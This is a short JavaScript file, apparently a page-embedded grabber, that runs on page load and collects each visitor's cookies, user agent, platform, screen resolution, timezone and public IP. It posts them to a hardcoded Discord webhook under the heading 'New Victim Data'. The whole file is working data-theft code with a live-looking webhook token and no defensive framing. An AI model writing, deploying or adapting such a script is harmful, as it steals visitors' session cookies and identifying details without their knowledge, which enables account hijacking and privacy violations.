// This function runs as soon as the page loads
window.onload = function() {
    // 1. COLLECT THE DATA
    const stolenData = {
        ip: "Fetching...", // We'll try to get this, but it's unreliable from JS alone due to CORS
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        cookie: document.cookie,
        screenResolution: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timestamp: new Date().toISOString()
    };

    // 2. TRY TO GET THE PUBLIC IP (using a third-party service)
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            stolenData.ip = data.ip;
            // Now that we have the IP, send the complete package
            sendData(stolenData);
        })
        .catch(error => {
            console.error('Could not fetch IP:', error);
            // Send what we have even if the IP fetch fails
            sendData(stolenData);
        });
};

// This is the IDIOT-PROOF version
function sendData(data) {
    const webhookURL = 'https://discord.com/api/webhooks/1449164820489179380/CuXHdA3kI3DEbumJR_uoBUkYxbyD-JUEN9LBZkvXVoeHS8vxpI8hXfuE7CHXudL4kdP7';

    // Build a simple, clean string. Avoid complex JSON-in-JSON.
    let messageContent = "--- New Victim Data ---\n";
    messageContent += `User Agent: ${data.userAgent}\n`;
    messageContent += `Language: ${data.language}\n`;
    messageContent += `Platform: ${data.platform}\n`;
    messageContent += `Screen Res: ${data.screenResolution}\n`;
    messageContent += `Timezone: ${data.timezone}\n`;
    messageContent += `Timestamp: ${data.timestamp}\n`;
    
    // Handle cookies carefully, as they can break things
    if (data.cookie) {
        // Truncate the cookie string if it's too long
        const safeCookie = data.cookie.substring(0, 1500);
        messageContent += `Cookies: ${safeCookie}\n`;
    }

    const payload = {
        content: messageContent
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json' // This is critical, as seen in the errors^3,4^
        },
        body: JSON.stringify(payload)
    });
}
